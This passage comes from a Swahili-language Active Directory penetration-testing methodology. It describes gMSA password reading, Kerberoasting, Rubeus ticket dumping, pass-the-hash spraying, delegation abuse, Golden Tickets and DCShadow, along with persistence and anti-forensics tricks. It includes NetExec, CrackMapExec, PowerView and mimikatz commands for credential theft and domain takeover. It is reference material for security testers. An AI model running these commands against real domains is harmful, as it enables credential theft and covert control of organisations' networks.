Kufeli kwa bind ya kawaida/NTLM **hakubatilishi** finding hii: jaribu kwa `-k`, FQDN inayotatua hadi DC, na saa iliyosawazishwa na KDC. Uendeshaji wa module uliofanikiwa huandika orodha za candidate na ccaches zilizopatikana chini ya `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Baada ya ku-compromise computer principal, chora ramani ya uanachama wake katika nested groups na haki zake za outbound. Hasa, principals waliotajwa katika security descriptor ya `msDS-GroupMSAMembership` ya gMSA wanaweza kusoma `msDS-ManagedPassword`; matokeo ya `--gmsa` ya NetExec huonyesha principals wanaoruhusiwa na kurejesha NT hash ya sasa ikiwa computer inayofanya authentication imeidhinishwa.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Kisha tathmini gMSA iliyorejeshwa kama credential nyingine yoyote: kagua uanachama wa makundi ya ndani/ya domain, haki za logon, SPN, delegation na huduma zinazoweza kufikiwa kabla ya kujaribu pass-the-hash. Njia hii ya kupata credential inayotegemea ACL ni tofauti na [Golden gMSA/dMSA](golden-dmsa-gmsa.md), ambayo hukokotoa nywila zinazosimamiwa baada ya KDS root-key compromise.<sup>[[20]](#references)</sup>

Principal ya kompyuta pia inaweza kuwa na udhibiti wa kutoka juu ya object au makundi mengine ya kompyuta. Baada ya kuipata, kagua uanachama wake wa makundi yaliyopachikwa na ACL zinazotumika kwa ufanisi kando: ruhusa ya kuandika kwenye object nyingine ya kompyuta inaweza kuwezesha mabadiliko ya akaunti, na ruhusa za uanachama wa makundi zinaweza kutoa jukumu la logon. Alama ya staged-account, utaratibu wa majina unaotabirika au uhusiano wa `GenericWrite` pekee havithibitishi njia nzima.

Nakala inayosomeka ya blob ya `msDS-ManagedPassword` iliyo kwenye faili, share au backup ni njia tofauti ya kufichuka: ACL ya kusoma ya LDAP haiwezi kulinda nakala iliyohifadhiwa kwingine. Hakikisha data hiyo ni blob ya nywila inayosimamiwa kabla ya kuitafsiri, na tofautisha hali hii na usomaji ulioidhinishwa wa LDAP pamoja na ukokotoaji unaotumia KDS root-key.

### Kerberoast

Kerberoasting huhusisha kupata **tiketi za TGS** zinazotumiwa na huduma zilizounganishwa na akaunti za watumiaji na kuzivunja kwa kukisia nywila—ambazo ndizo msingi wa usimbaji wake—**offline**.

Soma zaidi kuhusu hili katika:


{{#ref}}
kerberoast.md
{{#endref}}

### Muunganisho wa mbali (RDP, SSH, FTP, Win-RM, n.k.)

Baada ya kupata credentials, unaweza kuangalia kama una ufikiaji wa **mashine** yoyote. Kwa hilo, unaweza kutumia **CrackMapExec** kujaribu kuunganisha kwenye seva kadhaa kwa kutumia protocols tofauti, kulingana na matokeo ya port scans zako.

### Local Privilege Escalation

Ikiwa umekiuka credentials au una session kama mtumiaji wa kawaida wa domain na unaweza kufikia **mashine yoyote kwenye domain**, tafuta njia ya **kuinua privileges ndani ya mashine na kukusanya credentials**. Privileges za local administrator zinaweza kukuwezesha **kudump hash za watumiaji wengine** kutoka kwenye memory (LSASS) na hifadhi ya ndani (SAM).

Kitabu hiki kina ukurasa mzima kuhusu [**local privilege escalation katika Windows**](../windows-local-privilege-escalation/index.html) na [**checklist**](../checklist-windows-privilege-escalation.md). Pia, usisahau kutumia [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tiketi za Session ya Sasa

Ni **vigumu sana** kupata **tiketi** katika session ya mtumiaji wa sasa zinazokupa **ruhusa ya kufikia** rasilimali usizotarajia, lakini unaweza kuangalia:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Ukiwa na domain credentials au session ya mtumiaji, kagua tena NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack): mbinu za authenticated enumeration na coercion zinaweza kufichua njia za relay ambazo hazikuwezekana wakati wa reconnaissance isiyohitaji uthibitishaji.

### Tafuta Creds katika Computer Shares | SMB Shares

Kwa kuwa sasa una credentials za msingi, unapaswa kuangalia kama unaweza **kupata** **faili zozote zinazovutia zinazoshirikiwa ndani ya AD**. Unaweza kufanya hivyo mwenyewe, lakini ni kazi inayochosha na inayojirudia sana (hasa ukipata mamia ya hati za kukagua).

[**Fuata kiungo hiki ili kujifunza kuhusu zana unazoweza kutumia.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Ikiwa unaweza **kufikia PC au shares nyingine**, unaweza **kuweka faili** (kama faili ya SCF) ambazo zikifikiwa kwa namna yoyote **zitaanzisha uthibitishaji wa NTLM dhidi yako**, ili uweze **kuiba** **NTLM challenge** na kuipasua:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Athari hii ilimwezesha mtumiaji yeyote aliyethibitishwa **kuathiri domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Kuongeza Privilege kwenye Active Directory UKIWA NA credentials/session zenye privilege

**Kwa mbinu zifuatazo, mtumiaji wa kawaida wa domain hatoshi; unahitaji privileges/credentials maalum ili kufanya mashambulizi haya.**

### Utoaji wa Hash

Tunatumaini umefanikiwa **kuathiri akaunti fulani ya local admin** kwa kutumia [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), ikijumuisha relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [kuongeza privileges ndani ya mfumo](../windows-local-privilege-escalation/index.html).\
Kisha, ni wakati wa kutoa hashes zote zilizopo kwenye memory na kwenye mfumo wa ndani.\
[**Soma ukurasa huu kuhusu njia mbalimbali za kupata hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Ukipata hash ya mtumiaji**, unaweza kuitumia **kujifanya kuwa mtumiaji huyo**.\
Unahitaji kutumia **tool** itakayotekeleza **uthibitishaji wa NTLM kwa kutumia** **hash** hiyo, **au** unaweza kuunda **sessionlogon** mpya na **kuingiza** **hash** hiyo kwenye **LSASS**, ili **hash hiyo itumike** kila **uthibitishaji wa NTLM unapotekelezwa**. Hilo ndilo chaguo la mwisho ambalo mimikatz hutumia.\
[**Soma ukurasa huu kwa maelezo zaidi.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Shambulio hili hulenga **kutumia NTLM hash ya mtumiaji kuomba Kerberos tickets**, kama njia mbadala ya Pass The Hash ya kawaida kupitia protocol ya NTLM. Kwa hiyo, linaweza kuwa **muhimu hasa kwenye mitandao ambako protocol ya NTLM imezimwa** na **Kerberos pekee ndiyo inaruhusiwa** kama protocol ya uthibitishaji.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Katika mbinu ya shambulio la **Pass The Ticket (PTT)**, washambuliaji **huiba tiketi ya uthibitishaji ya mtumiaji** badala ya password au thamani za hash. Kisha tiketi hii iliyoibwa hutumiwa **kujifanya kuwa mtumiaji huyo**, na kupata ufikiaji usioidhinishwa wa rasilimali na huduma ndani ya mtandao.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Ikiwa una **hash** au **password** ya **local administrator**, unapaswa kujaribu **kuingia ndani ya mfumo** kwenye **PC** nyingine ukitumia hiyo.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Kumbuka kuwa hii ina **kelele** nyingi na **LAPS** ingeweza **kupunguza athari** zake.

### Matumizi Mabaya ya MSSQL na Trusted Links

Ikiwa mtumiaji ana ruhusa za **kufikia instances za MSSQL**, anaweza kutumia ruhusa hizo **kutekeleza amri** kwenye host ya MSSQL (ikiwa inaendeshwa kama SA), **kuiba** **hash** ya NetNTLM, au hata kufanya **shambulio la** **relay**.\
Ikiwa instance ya MSSQL inaaminika kupitia kiungo cha hifadhidata kutoka kwa instance nyingine, mtumiaji mwenye ruhusa kwenye hifadhidata iliyounganishwa anaweza **kutumia uhusiano huo wa uaminifu kutekeleza queries kwenye instance nyingine**. Uhusiano huu wa uaminifu unaweza kuunganishwa kwa mnyororo na hatimaye kufikia hifadhidata iliyosanidiwa vibaya ambapo mtumiaji anaweza kutekeleza amri.\
**Viungo kati ya hifadhidata hufanya kazi hata katika trust za forest.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Matumizi mabaya ya majukwaa ya IT asset/deployment

Suiti za wahusika wengine za inventory na deployment mara nyingi hutoa njia zenye nguvu za kupata credentials na kutekeleza code. Tazama:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Ukipata Computer object yoyote yenye attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) na una ruhusa za domain kwenye kompyuta hiyo, utaweza kudump TGT kutoka kwenye memory ya kila mtumiaji anayeingia kwenye kompyuta hiyo.\
Kwa hiyo, **ikiwa Domain Admin ataingia kwenye kompyuta hiyo**, utaweza kudump TGT yake na kujifanya yeye kwa kutumia [Pass the Ticket](pass-the-ticket.md).\
Kwa kutumia constrained delegation unaweza hata **kucompromise Print Server kiotomatiki** (kwa matumaini itakuwa DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Ikiwa mtumiaji au kompyuta inaruhusiwa kutumia "Constrained Delegation", itaweza **kujinasa kama mtumiaji yeyote ili kufikia baadhi ya services kwenye kompyuta**.\
Kisha, **ukicompromise hash** ya mtumiaji/kompyuta hiyo utaweza **kujinasa kama mtumiaji yeyote** (hata domain admins) ili kufikia baadhi ya services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Kuwa na ruhusa ya **WRITE** kwenye object ya Active Directory ya kompyuta ya mbali kunawezesha kupata uwezo wa kutekeleza code kwa **ruhusa zilizoinuliwa**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Matumizi mabaya ya ruhusa/ACLs

Mtumiaji aliyecompromise anaweza kuwa na **ruhusa za kuvutia kwenye baadhi ya objects za domain** zinazoweza kukuwezesha **kuhamia** upande mwingine/**kuongeza** ruhusa.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Matumizi mabaya ya huduma ya Printer Spooler

Kugundua huduma ya **Spool inayosikiliza** ndani ya domain kunaweza **kutumiwa vibaya** ili **kupata credentials mpya** na **kuongeza ruhusa**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Matumizi mabaya ya sessions za wahusika wengine

Ikiwa **watumiaji wengine** **watafikia** mashine **iliyo-compromise**, inawezekana **kukusanya credentials kutoka kwenye memory** na hata **kuingiza beacons kwenye processes zao** ili kujifanya wao.\
Kwa kawaida watumiaji hufikia mfumo kupitia RDP. Hivyo, hapa kuna maelekezo ya kufanya mashambulizi kadhaa dhidi ya sessions za RDP za wahusika wengine:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** hutoa mfumo wa kusimamia **nenosiri la Administrator la ndani** kwenye kompyuta zilizounganishwa kwenye domain, na kuhakikisha kuwa **linabadilishwa bila mpangilio**, ni la kipekee, na **hubadilishwa** mara kwa mara. Nenosiri hizi huhifadhiwa kwenye Active Directory na ufikiaji wake hudhibitiwa kupitia ACLs ili watumiaji walioidhinishwa pekee waweze kuzifikia. Ukiwa na ruhusa za kutosha za kufikia nenosiri hizi, unaweza kuhamia kwenye kompyuta nyingine.


{{#ref}}
laps.md
{{#endref}}

### Wizi wa vyeti

Kwa maelezo kuhusu usajili wa AD CS, ulinganishaji wa vyeti, na enumeration kabla ya kuendelea na wizi wa vyeti au matumizi mabaya ya template, tazama [muhtasari wa AD Certificates](ad-certificates.md).

**Kukusanya vyeti** kutoka kwenye mashine iliyo-compromise kunaweza kuwa njia ya kuongeza ruhusa ndani ya mazingira:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Matumizi mabaya ya Certificate Templates

Ikiwa **template zilizo hatarini** zimesanidiwa, inawezekana kuzitumia vibaya ili kuongeza ruhusa:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation kwa kutumia akaunti yenye ruhusa za juu

### Kudump credentials za Domain

Mara tu unapopata ruhusa za **Domain Admin**, au bora zaidi, **Enterprise Admin**, unaweza **kudump** **hifadhidata ya domain**: _ntds.dit_.

[**Maelezo zaidi kuhusu shambulio la DCSync yanapatikana hapa**](dcsync.md).

[**Maelezo zaidi kuhusu jinsi ya kuiba NTDS.dit yanapatikana hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Nakala ya akiba inayosomeka yenye `ntds.dit` pamoja na hive ya `SYSTEM` inapaswa kuchukuliwa kuwa na maudhui ya directory yaliyofichuka hata kabla ya kuyatoa. Hash ya nenosiri iliyopitwa na wakati haimaanishi kuwa attributes nyingine za object ni salama: sehemu kama `description` zinaweza kuwa na credentials au maelezo ya kiutendaji. Kagua majina ya wanachama wa archive kwanza na usijumuishe maudhui ya hifadhidata yaliyotolewa kwenye matokeo ya kawaida ya enumeration.

### Privesc kama Persistence

Baadhi ya mbinu zilizojadiliwa hapo awali zinaweza kutumiwa kwa persistence.\
Kwa mfano, unaweza:

- Kuwafanya watumiaji wawe katika hatari ya [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Wafanya watumiaji wawe katika hatari ya [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Mpe mtumiaji ruhusa za [**DCSync**](#dcsync)

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack** huunda tiketi halali ya **Ticket Granting Service (TGS)** kwa huduma mahususi kwa kutumia **NTLM hash** (kwa mfano, **hash ya akaunti ya PC**). Mbinu hii hutumiwa kupata **ruhusa za huduma**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** huhusisha mshambuliaji kupata **NTLM hash ya akaunti ya krbtgt** katika mazingira ya Active Directory (AD). Akaunti hii ni maalumu kwa sababu hutumiwa kusaini **Ticket Granting Tickets (TGTs)** zote, ambazo ni muhimu kwa uthibitishaji ndani ya mtandao wa AD.

Mara mshambuliaji anapopata hash hii, anaweza kuunda **TGTs** za akaunti yoyote anayoichagua (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Hizi ni kama golden tickets zilizoghushiwa kwa njia inayoweza **kwepa mbinu za kawaida za kugundua golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Uendelevu wa Akaunti kupitia Certificates**

**Kuwa na certificates za akaunti au kuweza kuziomba** ni njia nzuri sana ya kudumisha ufikiaji wa akaunti ya mtumiaji (hata akibadilisha password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Uendelevu wa Domain kupitia Certificates**

**Inawezekana pia kutumia certificates kudumisha ufikiaji wenye ruhusa za juu ndani ya domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Kikundi cha AdminSDHolder

Kipengee cha **AdminSDHolder** katika Active Directory huhakikisha usalama wa **vikundi vyenye ruhusa za juu** (kama vile Domain Admins na Enterprise Admins) kwa kutumia **Access Control List (ACL)** ya kawaida kwa vikundi hivyo ili kuzuia mabadiliko yasiyoidhinishwa. Hata hivyo, kipengele hiki kinaweza kutumiwa vibaya; mshambuliaji akibadilisha ACL ya AdminSDHolder ili kumpa mtumiaji wa kawaida ufikiaji kamili, mtumiaji huyo hupata udhibiti mkubwa juu ya vikundi vyote vyenye ruhusa za juu. Kwa hiyo, hatua hii ya usalama iliyokusudiwa kulinda inaweza kuwa kinyume na lengo lake na kuruhusu ufikiaji usioidhinishwa isipofuatiliwa kwa karibu.

[**Pata maelezo zaidi kuhusu Kikundi cha AdminDSHolder hapa.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Sifa za DSRM

Ndani ya kila **Domain Controller (DC)** kuna akaunti ya **local administrator**. Kwa kupata haki za admin kwenye mashine kama hiyo, hash ya local Administrator inaweza kutolewa kwa kutumia **mimikatz**. Baada ya hapo, ni lazima kurekebisha registry ili **kuwezesha matumizi ya password hii**, na hivyo kuruhusu ufikiaji wa mbali kwa akaunti ya local Administrator.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Uendelevu kupitia ACL

Unaweza **kumpa** **mtumiaji** **ruhusa maalumu** juu ya baadhi ya objects mahususi za domain, zitakazomwezesha **kupandisha privileges baadaye**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptors** hutumika **kuhifadhi** **ruhusa** ambazo **object** inazo **juu ya** **object** nyingine. Ukiweza tu kufanya **mabadiliko madogo** kwenye **security descriptor** ya object, unaweza kupata privileges za kuvutia sana juu ya object hiyo bila kuhitaji kuwa mwanachama wa kikundi chenye ruhusa za juu.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Tumia vibaya auxiliary class ya `dynamicObject` kuunda principals/GPOs/DNS records za muda mfupi zenye `entryTTL`/`msDS-Entry-Time-To-Die`; hujifuta zenyewe bila tombstones, na kufuta ushahidi wa LDAP huku zikibakiza SIDs zilizotelekezwa, marejeleo ya `gPLink` yaliyovunjika, au majibu ya DNS yaliyohifadhiwa kwenye cache (kwa mfano, uchafuzi wa ACE wa AdminSDHolder au uelekezaji upya hasidi wa `gPCFileSysPath`/AD-integrated DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Badilisha **LSASS** iliyo kwenye memory ili kuweka **password ya jumla**, na hivyo kupata ufikiaji wa akaunti zote za domain.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Jifunze SSP (Security Support Provider) ni nini hapa.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kunasa** **credentials** zinazotumika kufikia mashine katika **clear text**.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Husajili **Domain Controller** mpya katika AD na kuitumia **kusukuma attributes** (SIDHistory, SPNs...) kwenye objects maalumu **bila** kuacha **logs** zozote kuhusu **mabadiliko** hayo. Unahitaji privileges za **DA** na lazima uwe ndani ya **root domain**.\
Kumbuka kwamba ukitumia data isiyo sahihi, logs mbaya sana zitaonekana.


{{#ref}}
dcshadow.md
{{#endref}}

### Uendelevu kupitia LAPS

Hapo awali tulijadili jinsi ya kupandisha privileges ikiwa una **ruhusa za kutosha kusoma passwords za LAPS**. Hata hivyo, passwords hizi pia zinaweza kutumika **kudumisha ufikiaji**.\
Angalia:


{{#ref}}
laps.md
{{#endref}}

## Kupandisha Privileges katika Forest - Domain Trusts

Microsoft huichukulia **Forest** kuwa mpaka wa usalama. Hii ina maana kwamba **kuhatarisha domain moja kunaweza kusababisha Forest nzima kuhatarishwa**.<sup>[[1]](#references)</sup>

### Taarifa za Msingi

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ni utaratibu wa usalama unaomwezesha mtumiaji kutoka **domain** moja kufikia rasilimali katika **domain** nyingine. Kimsingi, huunganisha mifumo ya uthibitishaji ya domain hizo mbili ili ukaguzi wa uthibitishaji ufanyike bila usumbufu. Domain zinapoweka trust, hubadilishana na kuhifadhi **keys** maalumu ndani ya **Domain Controllers (DCs)** zao, ambazo ni muhimu kwa uadilifu wa trust hiyo.

Katika hali ya kawaida, mtumiaji anapotaka kufikia huduma katika **domain inayoaminiwa**, lazima kwanza aombe tiketi maalumu inayoitwa **inter-realm TGT** kutoka kwa DC ya domain yake. TGT hii husimbwa kwa kutumia **key** ya pamoja ambayo domain zote mbili zimekubaliana kuitumia. Kisha mtumiaji huiwasilisha TGT hii kwa **DC ya domain inayoaminiwa** ili kupata tiketi ya huduma (**TGS**). Baada ya DC ya domain inayoaminiwa kuthibitisha kwa mafanikio inter-realm TGT, hutoa TGS inayompa mtumiaji ufikiaji wa huduma hiyo.

**Hatua**:

1. **Kompyuta ya mteja** katika **Domain 1** huanzisha mchakato kwa kutumia **NTLM hash** yake kuomba **Ticket Granting Ticket (TGT)** kutoka kwa **Domain Controller (DC1)** yake.
2. DC1 hutoa TGT mpya ikiwa uthibitishaji wa mteja umefaulu.
3. Kisha mteja huomba **inter-realm TGT** kutoka kwa DC1, inayohitajika kufikia rasilimali katika **Domain 2**.
4. Inter-realm TGT husimbwa kwa kutumia **trust key** inayoshirikiwa kati ya DC1 na DC2 kama sehemu ya domain trust ya pande mbili.
5. Mteja huipeleka inter-realm TGT kwa **Domain Controller (DC2) ya Domain 2**.
6. DC2 huthibitisha inter-realm TGT kwa kutumia trust key yake ya pamoja na, ikiwa ni halali, hutoa **Ticket Granting Service (TGS)** ya server katika Domain 2 ambayo mteja anataka kufikia.
7. Mwishowe, mteja huiwasilisha TGS hii kwa server, ambayo imesimbwa kwa hash ya akaunti ya server, ili kupata ufikiaji wa huduma katika Domain 2.

### Aina tofauti za trusts

Ni muhimu kutambua kwamba **trust inaweza kuwa ya upande 1 au pande 2**. Katika trust ya pande 2, domain zote mbili huaminiana; lakini katika trust ya **upande 1**, domain moja itakuwa **trusted** na nyingine **trusting**. Katika hali ya mwisho, **utaweza tu kufikia rasilimali zilizo ndani ya trusting domain kutoka trusted domain**.

Ikiwa Domain A inaiamini Domain B, A ndiyo trusting domain na B ndiyo trusted domain. Aidha, katika **Domain A**, huu utakuwa **Outbound trust**; na katika **Domain B**, utakuwa **Inbound trust**.

**Mahusiano tofauti ya kuaminiana**

- **Parent-Child Trusts**: Huu ni mpangilio wa kawaida ndani ya forest ileile, ambapo child domain huwa na trust ya pande mbili inayovuka mipaka (transitive) na parent domain yake. Kimsingi, hii ina maana kwamba maombi ya uthibitishaji yanaweza kupita bila usumbufu kati ya parent na child.
- **Cross-link Trusts**: Zinazojulikana pia kama "shortcut trusts," huwekwa kati ya child domains ili kuharakisha mchakato wa referral. Katika forest changamano, referral za uthibitishaji kwa kawaida hulazimika kupanda hadi forest root na kisha kushuka hadi domain lengwa. Kuunda cross-links hupunguza safari hii, jambo ambalo husaidia hasa katika mazingira yaliyosambaa kijiografia.
- **External Trusts**: Huwekwa kati ya domain tofauti zisizohusiana na kwa asili hazivuki mipaka (non-transitive). Kulingana na [nyaraka za Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts ni muhimu kwa kufikia rasilimali katika domain iliyo nje ya forest ya sasa na ambayo haijaunganishwa kwa forest trust. Usalama huimarishwa kupitia SID filtering katika external trusts.
- **Tree-root Trusts**: Trust hizi huanzishwa kiotomatiki kati ya forest root domain na tree root mpya iliyoongezwa. Ingawa hazionekani mara nyingi, tree-root trusts ni muhimu kwa kuongeza domain trees mpya kwenye forest, na kuziwezesha kutumia jina la kipekee la domain huku zikihakikisha transitivity ya pande mbili. Maelezo zaidi yanapatikana katika [mwongozo wa Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Aina hii ya trust ni trust ya pande mbili inayovuka mipaka kati ya forest root domains mbili, na pia hutumia SID filtering ili kuimarisha usalama.
- **MIT Trusts**: Trust hizi huanzishwa na domain za Kerberos zisizo za Windows zinazotii [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts ni maalumu zaidi na hutumika katika mazingira yanayohitaji kuunganishwa na mifumo inayotumia Kerberos nje ya mfumo wa Windows.

#### Tofauti nyingine katika **mahusiano ya kuaminiana**

- Trust relationship inaweza pia kuwa **transitive** (A huiamini B, B huiamini C, basi A huiamini C) au **non-transitive**.
- Trust relationship inaweza kuwekwa kama **bidirectional trust** (pande zote zinaaminiana) au **one-way trust** (moja tu ndiyo inayoamini nyingine).

### Njia ya Mashambulizi

1. **Orodhesha** mahusiano ya kuaminiana.
2. Angalia ikiwa **security principal** yoyote (user/group/computer) ina **ufikiaji** wa rasilimali za **domain nyingine**, labda kupitia maingizo ya ACE au kwa kuwa mwanachama wa groups za domain nyingine. Tafuta **mahusiano kati ya domains** (huenda trust iliundwa kwa sababu hiyo).
   1. Katika hali hii, kerberoast inaweza kuwa chaguo jingine.
3. **Hatarisha** **akaunti** zinazoweza **kuhamia** kati ya domains.

Washambuliaji wanaoweza kufikia rasilimali katika domain nyingine wana njia kuu tatu za kufanya hivyo:

- **Uanachama wa Local Group**: Principals zinaweza kuongezwa kwenye local groups za mashine, kama vile kikundi cha “Administrators” kwenye server, na hivyo kupewa udhibiti mkubwa juu ya mashine hiyo.
- **Uanachama wa Kikundi katika Domain ya Kigeni**: Principals zinaweza pia kuwa wanachama wa groups ndani ya domain ya kigeni. Hata hivyo, ufanisi wa njia hii hutegemea aina ya trust na wigo wa group hiyo.
- **Access Control Lists (ACLs)**: Principals zinaweza kuorodheshwa katika **ACL**, hasa kama entities katika **ACEs** ndani ya **DACL**, na hivyo kupewa ufikiaji wa rasilimali mahususi. Kwa wanaotaka kuelewa kwa kina zaidi jinsi ACLs, DACLs na ACEs zinavyofanya kazi, whitepaper yenye kichwa “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” ni rasilimali muhimu sana.<sup>[[17]](#references)</sup>

### Tafuta users/groups za nje zilizo na ruhusa

Unaweza kukagua **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** ili kupata foreign security principals katika domain. Hawa watakuwa users/groups kutoka **domain/forest ya nje**.

Unaweza kukagua hili katika **Bloodhound** au kwa kutumia powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Njia nyingine za enumerate domain trusts:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Kuna **funguo 2 zinazoaminika**, moja ya _Child --> Parent_ na nyingine ya _Parent_ --> _Child_.\
> Unaweza kupata ile inayotumiwa na domain ya sasa kwa kutumia:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Panda mamlaka hadi Enterprise admin katika child/parent domain kwa kutumia vibaya trust kupitia SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Kuelewa jinsi Configuration Naming Context (NC) inavyoweza kutumiwa vibaya ni muhimu. Configuration NC hutumika kama hazina kuu ya data za usanidi katika forest za mazingira ya Active Directory (AD). Data hii huigwa kwa kila Domain Controller (DC) ndani ya forest, huku DC zinazoweza kuandikwa zikihifadhi nakala inayoweza kuandikwa ya Configuration NC. Ili kutumia hili vibaya, ni lazima uwe na **SYSTEM privileges kwenye DC**, ikiwezekana child DC.

**Unganisha GPO na tovuti ya root DC**

Kontena la Sites la Configuration NC linajumuisha taarifa kuhusu tovuti za kompyuta zote zilizojiunga na domain ndani ya AD forest. Kwa kutumia SYSTEM privileges kwenye DC yoyote, washambuliaji wanaweza kuunganisha GPO kwenye tovuti za root DC. Hatua hii inaweza kuhatarisha root domain kwa kubadilisha sera zinazotumika kwenye tovuti hizi.

Kwa maelezo ya kina, unaweza kusoma utafiti kuhusu [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Hatarisha gMSA yoyote katika forest**

Njia moja ya mashambulizi ni kulenga gMSA zenye mamlaka ya juu ndani ya domain. KDS Root key, ambayo ni muhimu kwa kukokotoa nywila za gMSA, huhifadhiwa ndani ya Configuration NC. Ukiwa na SYSTEM privileges kwenye DC yoyote, unaweza kufikia KDS Root key na kukokotoa nywila za gMSA yoyote katika forest.

Uchambuzi wa kina na mwongozo wa hatua kwa hatua unapatikana katika:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Shambulio la ziada dhidi ya MSA iliyokabidhiwa (BadSuccessor – kutumia vibaya sifa za uhamishaji):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
